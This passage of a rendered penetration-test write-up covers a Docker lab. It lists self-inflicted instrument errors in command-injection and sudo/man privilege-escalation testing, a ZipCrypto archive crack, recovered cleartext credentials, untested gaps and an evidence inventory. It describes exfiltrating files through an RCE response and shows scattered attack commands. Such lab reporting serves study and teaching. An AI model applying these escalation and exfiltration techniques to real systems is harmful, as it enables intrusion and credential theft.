+<p><strong>Class.</strong> A control whose distinguishing variable was silently empty. The instrument reported a plausible negative because the <em>instrument itself</em> was misconfigured; nothing in the output distinguishes &quot;target refused&quot; from &quot;I never sent the thing I thought I sent&quot;.</p>
+<p><strong>Fix applied.</strong> Dumped the URL-encoded payload and byte-compared it against the intended nonce <strong>before</strong> trusting the result (<code>RAW_PARAM</code> and <code>ENCODED_URL</code> are recorded per-request in <code>evidence/ladder.txt</code>, <code>evidence/sweep.txt</code>, <code>evidence/marker_ladder.txt</code> for exactly this reason). Re-ran with the nonce baked in; <code>stat -c</code> then returned <code>0 bytes mode=644 uid=33</code>.</p>
+<h3 id="i2--a-21--grep-pipeline-swallowed-the-error-and-i-attributed-the-emptiness-to-the-wrong-cause">I2 — A <code>2&gt;&amp;1 | grep</code> pipeline swallowed the error and I attributed the emptiness to the wrong cause</h3>
+<p><strong>Defect.</strong> To test whether <code>sudo</code> passes <code>MANPAGER</code>, I ran <code>sudo -u balutin env 2&gt;&amp;1 | grep -iE &quot;^(MANPAGER|PAGER|DISPLAY)=&quot;</code> and read <code>rc=1</code> as &quot;those variables are absent, therefore <code>env_reset</code> strips them&quot;.</p>
+<p><strong>Truth.</strong> <code>sudo</code> never ran <code>env</code> at all. <code>/usr/bin/env</code> is not in the allowlist, so sudo emitted <code>sudo: a password is required</code> on stderr — and because stderr was piped into <code>grep</code>, the message was <strong>discarded by the very filter meant to search for it</strong>. <code>grep</code> then returned 1 because it found nothing, which I read as a statement about the environment.</p>
+<p><strong>What it would have caused me to file.</strong> &quot;The pager route fails because <code>sudo</code>'s <code>env_reset</code> strips <code>MANPAGER</code>.&quot; The grant is real and the conclusion is wrong: the route fails because sudoers grants <strong>no <code>SETENV</code></strong> and <code>env</code> itself is not permitted. A reader reproducing this would chase <code>env_keep</code>/<code>env_delete</code> in <code>sudoers</code> and find nothing there.</p>
+<p><strong>Class.</strong> A pipeline used as a detector, where the detector's own failure path is routed into the detector's input. The instrument cannot distinguish &quot;the thing I searched for is absent&quot; from &quot;the search never ran&quot;, and <code>rc</code> belonged to the wrong process.</p>
+<p><strong>Fix applied.</strong> Re-ran the three probes with output redirected to a file and the exit code captured <strong>per command</strong>, so the allowlist question is answered by <code>man</code>→0 / <code>id</code>→1 / <code>env</code>→1 with the actual error text preserved. The <code>MANPAGER</code> question was then settled by the decisive test — <code>sudo</code> refusing to set it by name — plus an OOB marker check.</p>
+<h3 id="i3--shell-redirect-precedence-silently-truncated-my-own-command-output">I3 — Shell redirect precedence silently truncated my own command output</h3>
+<p><strong>Defect.</strong> My helper ran <code>sink 'id; id -u; hostname'</code>, which expanded to <code>whoami;id; id -u; hostname &gt; /tmp/r73.out 2&gt;&amp;1</code>. In shell, a redirect binds <strong>only to the last command of a list</strong>. <code>whoami</code>, <code>id</code>, and <code>id -u</code> wrote to the response body while only <code>hostname</code> was captured to the file — and the subsequent <code>cat</code> returned a single line.</p>
+<p><strong>What it looked like.</strong> <code>&lt;pre&gt;www-data</code> then <code>0f38876b0aa7</code>, with <code>uid=33(www-data) gid=33(www-data)</code> and <code>33</code> apparently <strong>missing</strong>. That is the shape of a partial execution.</p>
+<p><strong>What it would have caused me to file.</strong> A wrong account of the execution identity — plausibly &quot;the <code>id</code> builtin is filtered or the output is truncated by the page&quot;, which would have sent me looking for a nonexistent <code>disable_functions</code> entry instead of reading the correct <code>php.ini:323</code>.</p>
+<p><strong>Class.</strong> Shell error-propagation blindness, self-inflicted. Nothing in an HTTP response distinguishes &quot;this command produced no output&quot; from &quot;this command was never redirected where I thought&quot;.</p>
+<p><strong>Fix applied.</strong> Every command is now wrapped as <code>sh -c '&lt;command&gt; &gt; /tmp/r73.out 2&gt;&amp;1'</code>, so the redirect governs the whole list, and the identity is asserted explicitly (<code>EUID=… USER=…</code>) instead of being inferred from output that might have been truncated.</p>
+<h3 id="i4--my-zipcrypto-cracker-reported-no-match-while-being-broken-and-i-nearly-recorded-that-as-a-fact-about-the-archive">I4 — My ZipCrypto cracker reported &quot;no match&quot; while being broken, and I nearly recorded that as a fact about the archive</h3>
+<p><strong>Defect.</strong> The cracker returned <code>no match after 123 candidates</code> against 123 themed passwords. It was wrong. Three separate defects, found only because I tested it against an archive whose password I already knew:</p>
+<ol>
+<li>I handed the <strong>12-byte PKWARE encryption header</strong> to <code>zlib.decompress</code>. That header must be decrypted (to advance the key schedule) but is not part of the compressed stream.</li>
+<li>I masked the stream byte to 16 bits: <code>(k2 | 2) &amp; 0xFFFF</code>. CPython's <code>zipfile._ZipDecrypter</code> uses <code>k = key2 | 2</code> with <strong>no mask</strong>, and a table-driven CRC primitive rather than <code>zlib.crc32</code> — the two are not interchangeable, because XOR with <code>0xFFFFFFFF</code> changes the table index.</li>
+<li>The negative printed a confident, well-formatted <code>no match after 123 candidates</code>, indistinguishable in tone from a correct result.</li>
+</ol>
+<p><strong>What it would have caused me to file.</strong> &quot;The archive is not protected by a weak dictionary password, or the password is outside any reasonable wordlist&quot; — a <strong>negative about the target</strong>, produced entirely by a broken instrument, resting on a tool I had written minutes earlier and never validated. It is the purest form of the failure this corpus exists to document: the instrument had no failure mode visible to me, so its silence read as evidence.</p>
+<p><strong>Class.</strong> Unvalidated instrument. A negative from a detector that has never produced a positive is not a negative; it is an absence of testing.</p>
+<p><strong>Fix applied.</strong> The cracker now faces a <strong>known-answer control</strong> — an archive I create locally with a password I choose — and must both crack it and produce byte-identical output before it is allowed to report anything about the target. It is validated in both directions: positive control (<code>CRACKED after 2 candidates: 'ctlpass'</code>, output <code>sha256</code> matching the original file) and negative control (wrong-password list correctly returns no match, exit 1). Only then was it run against <code>secretito.zip</code>.</p>
+<h3 id="i5--a-speed-optimisation-i-added-manufactured-a-false-negative-against-a-known-good-password">I5 — A &quot;speed optimisation&quot; I added manufactured a false negative against a known-good password</h3>
+<p><strong>Defect.</strong> After fixing the cipher, I added a prefilter: decrypt only the 12-byte header and require the last byte to equal the CRC's high byte, rejecting 255 of every 256 candidates before the expensive inflate. Re-running the <strong>known-answer control</strong> then produced <code>no match after 2 candidates (0 passed prefilter)</code> — the correct password was rejected by my own filter.</p>
+<p><strong>What it would have caused me to file.</strong> Had I not re-run the control, a wrong hypothesis about the check-byte convention (Info-ZIP sets it from the DOS timestamp, not the CRC) would have silently discarded the true password and every other candidate too. The output would still have read <code>no match after 101074 candidates</code>, looking like an exhaustive, rigorous, thoroughly fruitless search.</p>
+<p><strong>Class.</strong> An optimisation that changes the <em>result</em> rather than the cost, with no test capable of distinguishing &quot;nothing left to try&quot; from &quot;my filter excludes the answer&quot;. Prefilters must be provably lossless.</p>
+<p><strong>Fix applied.</strong> Prefilter <strong>disabled</strong>, with the reason recorded in the source next to the code: correctness over speed. Throughput without it (~5.5k candidates/s) made the full 101,074-candidate sweep a 12.8-second job, so the optimisation was never worth the risk.</p>
+<h3 id="i6--my-helpers-printf-q-emitted-bash-only-quoting-that-dash-cannot-parse">I6 — My helper's <code>printf %q</code> emitted bash-only quoting that dash cannot parse</h3>
+<p><strong>Defect.</strong> To build the command string safely I used <code>printf %q</code>, which produces <code>$'line1\nline2'</code>. The container's <code>/bin/sh</code> is <strong>dash</strong>, which does not understand <code>$'…'</code>. Multi-line commands were mangled into literal text.</p>
+<p><strong>What it would have caused me to file.</strong> <code>sh: 1: %s\n: not found</code> and <code>script: unrecognized option '--- cmd.txt content ---ncat'</code> — an interpreter error that reads like my payload was malformed, i.e. like the privesc technique itself was failing. I was one step from abandoning a working escalation because my own quoting layer was broken.</p>
+<p><strong>Class.</strong> Using a shell-specific quoting form across a shell boundary. The escaping was valid where it was generated and invalid where it was consumed.</p>
+<p><strong>Fix applied.</strong> The command now reaches the URL builder through the <strong>environment</strong>, so no local quoting layer touches it. The target's own error log preserved the mangled form, which is how I confirmed the diagnosis rather than guessing at it.</p>
+<h3 id="i7--sticky-tmp-let-a-stale-artifact-masquerade-as-a-fresh-result">I7 — Sticky <code>/tmp</code> let a stale artifact masquerade as a fresh result</h3>
+<p><strong>Defect.</strong> My helper wrote results to <code>/tmp/bal.out</code> and began each run with <code>rm -f /tmp/bal.out</code> as <code>www-data</code>. Once <code>balutin</code> created that file, sticky-bit <code>/tmp</code> (<code>1777</code>) denied <code>www-data</code> the right to unlink it: <code>rm: cannot remove '/tmp/bal.out': Operation not permitted</code>. One run then returned output inconsistent with every other run — it displayed <strong>www-data's</strong> <code>sudo -l</code> rules during a sequence whose other runs were executing as <code>balutin</code>.</p>
+<p><strong>Why it matters more than a stale file.</strong> The instrument had no way to tell me the file was old. A cross-identity artifact directory in a world-writable sticky directory is a place where &quot;the last thing written here&quot; and &quot;the result of the command I just ran&quot; come apart, and the divergence is silent.</p>
+<p><strong>Fix applied.</strong> Each run writes to a <strong>fresh path</strong> (<code>bal2.out</code>, <code>bal3.out</code>, <code>bal4.out</code>, …) so an unwritable stale file cannot be read back as current, and every command echoes <code>EUID=… USER=…</code> as its first action so the identity is asserted by the run itself rather than inferred from context. The inconsistent run was treated as untrusted and excluded from the evidence chain rather than explained away.</p>
+<h3 id="i8--an-unsatisfied-su-prompt-hung-for-120-s-and-left-ten-processes-running-in-the-target">I8 — An unsatisfied <code>su</code> prompt hung for 120 s and left ten processes running in the target</h3>
+<p><strong>Defect.</strong> A nested-quoting failure turned my password argument into an empty string, so <code>script</code> fed nothing to <code>su</code>'s prompt. <code>su</code> blocked, my 120 s tool timeout fired, and the process tree survived: two <code>sh</code>, two <code>script</code>, two <code>sudo</code>, <code>man</code>, and a root-owned <code>su</code> holding a pty.</p>
+<p><strong>What it would have caused me to leave behind.</strong> Nine stray processes in a lab I was supposed to restore, including a root-owned <code>su</code> — invisible to any check that inspects only files. A reviewer comparing process lists before and after would find residue.</p>
+<p><strong>Class.</strong> An interactive prompt reached through a non-interactive pipe, with no timeout and no cleanup path. Also a reminder that &quot;restore&quot; covers process state, not just filesystem state.</p>
+<p><strong>Fix applied.</strong> Enumerated with <code>ps aux</code>, killed the tree by PID, and confirmed the pattern returned nothing. Subsequent <code>su</code> probes all carry <code>timeout 10</code>. Final state re-verified: <code>/proc/net/tcp</code> unchanged, docroot checksum unchanged.</p>
+<h3 id="i9--the-status-code-was-useless-as-a-discriminator-and-the-targets-own-body-was-the-decoy">I9 — The status code was useless as a discriminator, and the target's own body was the decoy</h3>
+<p><strong>Defect.</strong> Not a bug in my code but the single most important property of the instrument I was reading. <strong>Every</strong> request in this engagement returned <code>HTTP 200</code> — the clean <code>ping</code> baseline, both refusals, the successful RCE, and the empty-body backtick variant. And the bypass branch <em>begins</em> every response with an empty <code>&lt;pre&gt;&lt;/pre&gt;</code>, because line 17's <code>ping</code> fails with its error on an uncollected stderr.</p>
+<p><strong>What it would have caused me to file.</strong> Two errors, in opposite directions. Reading only the first <code>&lt;pre&gt;</code>: &quot;the bypass did not execute&quot; — a false negative on the lab's primary finding. Reading the empty backtick body: &quot;backticks are filtered&quot; — a false claim about filter coverage, with a real response body as its evidence.</p>
+<p><strong>Class.</strong> A success channel shadowed by a failure channel. <code>shell_exec</code> collects stdout only, so a failing first command contributes an empty success-looking block to every response, and the HTTP layer adds a <code>200</code> on top regardless.</p>
+<p><strong>Fix applied.</strong> Every conclusion in §3 rests on at least one of: a nonce I chose appearing in the body; a file whose existence and owner are confirmed out of band with <code>stat -c</code>; the target's <code>/var/log/apache2/error.log</code>, which independently witnesses line 17 failing; or a byte-count difference between request shapes. No claim in this writeup rests on a status code.</p>
+<h3 id="i10--my-work-count-was-reconstructed-after-the-fact">I10 — My work count was reconstructed after the fact</h3>
+<p><strong>Defect.</strong> The 65-request figure in §1 was <strong>not</strong> counted live. It was derived by grepping the archived evidence files for request markers and adding per-helper multipliers, then adding three miscellaneous enumeration requests by hand.</p>
+<p><strong>Why it is still stated, and how it errs.</strong> It is stated because a section whose purpose is to let a reader trust the numbers should not omit them. But it is derived from what I <strong>retained</strong>, and retention is not the same as activity: the six <code>su</code> password probes, the several <code>sudo -n -l</code> probes, and the probe whose output went only to my terminal were never archived individually. The true figure is <strong>at least</strong> 65 and the error is unidirectional — <strong>upward</strong>. A count that can only undercount makes a thin engagement look rigorous, which is precisely the failure mode worth naming.</p>
+<h3 id="i11--the-briefs-own-hypothesis-was-wrong-and-i-nearly-inherited-it">I11 — The brief's own hypothesis was wrong, and I nearly inherited it</h3>
+<p><strong>Defect.</strong> The task brief warned that <code>ping</code> might not be installed, which would make branch one a dead sink and change the meaning of every <code>200</code> on the page. It is installed (<code>/usr/bin/ping</code>, 90568 bytes) and branch one demonstrably executes four ICMP echoes.</p>
+<p><strong>What it would have caused me to write.</strong> A §1 stating that the first branch is inert and that a <code>200</code> is therefore meaningless here — which would have been a <strong>false negative on a live sink</strong>, sourced not from measurement but from an inherited assumption, and dressed in the vocabulary of a finding. It would also have weakened every control in the ladder, since the positive control at Hop 1 is exactly the thing the brief said would not work.</p>
+<p><strong>Class.</strong> Premise inheritance. A hypothesis supplied by the brief behaves like a measurement until it is checked, and checking it costs one command.</p>
+<hr />
+<h2 id="6-reward">6. Reward</h2>
+<p><strong>There is no flag token in this image, and that absence is measured, not assumed.</strong></p>
+<pre><code>$ find / -xdev \( -iname &quot;*flag*&quot; -o -iname &quot;*token*&quot; -o -iname &quot;*reward*&quot; \) 2&gt;/dev/null \
+    | grep -vE &quot;python|/usr/lib|/usr/share&quot;
+  → no results outside PHP's tokenizer module paths
+
+$ ls -la /root/        → .bashrc, .local, .profile     (no flag.txt)
+$ find /root -type f   → /root/.profile, /root/.bashrc
+</code></pre>
+<p>Whole-filesystem sweep for flag/token/reward names (0 hits), plus a direct enumeration of <code>/root</code> as the only plausible hiding place (no artefact). Consistent with the rest of the image: a single <code>ping.php</code>, one encrypted archive, one capture. DockerLabs labs of this family do not ship a flag file; the deliverable is the chain.</p>
+<p><strong>What was actually recovered</strong> — the reward this lab does contain, obtained legitimately through the RCE and the sudoers escalation:</p>
+<table>
+<thead>
+<tr>
+<th>Artefact</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Archive password</td>
+<td><code>chocolate</code> (ZipCrypto, candidate 22,574 of 101,074)</td>
+</tr>
+<tr>
+<td>Recovered file</td>
+<td><code>traffic.pcap</code>, 375 bytes, <code>sha256 e98d75f0…d97a4ce8c</code></td>
+</tr>
+<tr>
+<td>Credential 1 (cleartext form body)</td>
+<td><code>root</code> / <code>secretitosecretazo!</code></td>
+</tr>
+<tr>
+<td>Credential 2 (Base64 auth header)</td>
+<td><code>root</code> / <code>SuperSecret123!</code></td>
+</tr>
+<tr>
+<td>Highest identity reached</td>
+<td><code>uid=1000(balutin)</code></td>
+</tr>
+</tbody>
+</table>
+<p>Both credentials were then tested and <strong>both failed</strong> against local <code>su</code> (<code>su: Authentication failure</code>, one 10 s <code>timeout</code> each, <code>evidence/privesc_success.txt</code>). The capture's host is <code>ejemplo.com</code>, which is not this container. So the honest statement is: <strong>credential recovery completed; root was not reached, and the recovered credentials do not unlock anything here.</strong> The absence of a flag is corroborated by the absence of any service that would consume those credentials — §1 measured exactly one listener, and it is an unauthenticated web page.</p>
+<hr />
+<h2 id="7-not-tested">7. NOT tested</h2>
+<p>Declared as gaps, not closures.</p>
+<ol>
+<li><strong>UDP.</strong> <code>/proc/net/udp</code> is empty and <code>/proc/net/tcp6</code> has zero rows, but I performed <strong>no UDP probe from outside the container</strong> and no <code>nmap -sU</code>. The kernel tables are the only evidence. A UDP service bound in a way that does not appear in <code>/proc/net/udp</code> (e.g. via a raw socket or a namespace not visible to this PID) would be invisible to my method. <em>Untested, not closed.</em></li>
+<li><strong>Other hosts on the Docker network.</strong> The brief scoped <code>[net-0-8]</code> only. I did not sweep <code>[net-0-0]/24</code>. The image itself was not audited for other services.</li>
+<li><strong><code>man</code> manpage-content execution paths.</strong> I tested <code>'e</code> and <code>&quot;&quot;e</code> shell escapes in a crafted page and they rendered as literal text. I did <strong>not</strong> enumerate man-db's other preprocessor hooks (<code>zsoelim</code>, <code>manconv</code>, <code>MANROFFSEQ</code>) beyond noting that <code>MANROFFSEQ</code> is subject to the same <code>env_reset</code>/<code>no-SETENV</code> constraint that killed <code>MANPAGER</code>. A <code>.so</code>-include trick against <code>zsoelim</code> remains unexplored.</li>
+<li><strong><code>apache2</code> → <code>root</code> paths.</strong> <code>www-data</code> cannot write the docroot (measured: absent from the writable set), so a webshell drop was not possible. I did not test the mod_cache directory (<code>/var/cache/apache2/mod_cache_disk</code>, writable by <code>www-data</code>) as a cache-poisoning primitive — it is writable, and poisoning it is a real technique, but there is no second vhost or proxy to serve the poisoned entry.</li>
+<li><strong>Balutin's post-escalation options.</strong> Having <code>balutin</code> code execution, I measured <code>sudo -n -l</code> (no sudo) and the archive. I did not enumerate balutin's home beyond dotfiles and the zip, and did not check for setuid/<code>sgid</code> binaries <strong>inside</strong> paths balutin can reach, nor for cron entries owned by balutin.</li>
+<li><strong>The full wordlist space.</strong> 101,074 candidates (<code>sorted-passwords.txt</code>) found the password at position 22,574. The larger <code>Passwords.txt</code> (4.9M) was never run. The crack is therefore complete for this wordlist, not for all wordlists.</li>
+<li><strong>Password reuse for <code>balutin</code>.</strong> I tested the pcap credentials and <code>chocolate</code> against <strong>root</strong> only. I did not test them against <code>su balutin</code>, which is the more natural target given the sudoers rule names that account. This is a real gap and it is cheap to close.</li>
+<li><strong>TLS.</strong> Port 80 only; no HTTPS listener exists to assess.</li>
+</ol>
+<hr />
+<h2 id="8-evidence-inventory">8. Evidence inventory</h2>
+<p>Only files a reader can obtain. Paths relative to <code>corpus/73/evidence/</code>.</p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>What it is</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>src_ping_php.txt</code></td>
+<td>The 32-line vulnerable source, read from the container with line numbers</td>
+</tr>
+<tr>
+<td><code>target_recon.txt</code></td>
+<td><code>/proc/net/tcp</code> + <code>/proc/net/udp</code>, <code>ping</code> presence, docroot listing, container <code>id</code></td>
+</tr>
+<tr>
+<td><code>target_recon2.txt</code></td>
+<td><code>/proc/net/tcp6</code>, Apache <code>User</code>/<code>Group</code>, full <code>ps aux</code> process tree, PHP version, mods-enabled</td>
+</tr>
+<tr>
+<td><code>ladder.txt</code></td>
+<td>The 4-request control ladder: baseline, both negatives, the conjunction</td>
+</tr>
+<tr>
+<td><code>sweep.txt</code></td>
+<td>8-request metacharacter sweep, backslash pattern held constant</td>
+</tr>
+<tr>
+<td><code>control.txt</code></td>
+<td>Backtick controls: repeat of the empty body, marker write, marker <code>stat</code>, semicolon repeat</td>
+</tr>
+<tr>
+<td><code>marker_ladder.txt</code></td>
+<td>The nonce marker write, the empty-nonce failure, and the OOB <code>stat -c</code></td>
+</tr>
+<tr>
+<td><code>nonce.txt</code></td>
+<td>The nonce used: <code>CHOCOPING73-4bccb96faa6a</code></td>
+</tr>
+<tr>
+<td><code>privesc_identity.txt</code></td>
+<td>Identity probe plus <code>sudo -n -l</code>, SUID/SGID enumeration, <code>sudo -u balutin</code> allowlist tests</td>
+</tr>
+<tr>
+<td><code>privesc_writable.txt</code></td>
+<td><code>man -c</code> / <code>-P</code> / <code>MANPAGER</code> negative tests, crafted-manpage negative, writable-path sweep, cron, capabilities</td>
+</tr>
+<tr>
+<td><code>privesc_success.txt</code></td>
+<td><code>script</code>-based <code>man -P</code> escalation, <code>EUID=1000</code> proof, zip copy, <code>su</code> credential tests</td>
+</tr>
+<tr>
+<td><code>php_and_logs.txt</code></td>
+<td><code>php.ini</code> restriction values and the <code>error.log</code> witness of line 17 failing on every bypass request</td>
+</tr>
+<tr>
+<td><code>artifact_hunt_root.txt</code></td>
+<td><strong>Operator-side</strong> (host root, not via the RCE): filesystem sweep, <code>[lab-home]/balutin</code> listing, zip contents</td>
+</tr>
+<tr>
+<td><code>reward_probe_root.txt</code></td>
+<td><strong>Operator-side</strong>: the flag-absence sweep and <code>/root</code> enumeration backing §6</td>
+</tr>
+<tr>
+<td><code>secretito.zip</code></td>
+<td>The archive as pulled from the target, 483 bytes, <code>sha256 85e98bd7…f81cd51</code></td>
+</tr>
+<tr>
+<td><code>zip_b64_raw.txt</code></td>
+<td>Raw exfiltration of the archive through the RCE response body</td>
+</tr>
+<tr>
+<td><code>zipcrypto_crack.py</code></td>
+<td>The ZipCrypto verifier, carrying its own validation rationale in comments</td>
+</tr>
+<tr>
+<td><code>cand_themed.txt</code></td>
+<td>The 123 themed candidates tried before the wordlist run</td>
+</tr>
+<tr>
+<td><code>pcap_analysis.txt</code></td>
+<td>File type, hashes, <code>zipinfo</code> encryption facts, pcap header, extracted strings, decoded Basic auth, crack log</td>
+</tr>
+<tr>
+<td><code>traffic.pcap</code></td>
+<td>The recovered capture, 375 bytes</td>
+</tr>
+<tr>
+<td><code>restore_verify.txt</code></td>
+<td><code>stat -c</code> absence proof for every created artefact, empty <code>/tmp</code>, docroot checksum, listener table</td>
+</tr>
+<tr>
+<td><code>work_count.txt</code></td>
+<td>The 65-request accounting and its derivation</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Two files are labelled operator-side for a reason.</strong> <code>artifact_hunt_root.txt</code> and <code>reward_probe_root.txt</code> were produced with host <code>docker exec</code>, which runs as <strong>root</strong>, not through the RCE chain. They are used only to establish <em>what exists</em> in the image (§6 flag absence) and never as evidence for a claim about what the attack chain can reach. Every reachability claim in §3 and §4 comes from a request through <code>[net-0-8]</code>.</p>
+<p><strong>Restore.</strong> Every artefact created in the target was removed and its absence proven with <code>stat -c</code>, not inferred from a listing (<code>restore_verify.txt</code>). <code>/tmp</code> returns empty. <code>/var/www/html/ping.php</code> is unchanged at 1011 bytes, mtime <code>2025-04-05 11:13:39</code>, <code>md5 4f1dcc0a24757fa81ca35ce1f55852e9</code>. <code>[lab-home]/balutin/</code> is untouched. <code>/proc/net/tcp</code> still shows the single <code>00000000:0050</code> listener. The container was neither stopped nor removed.</p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
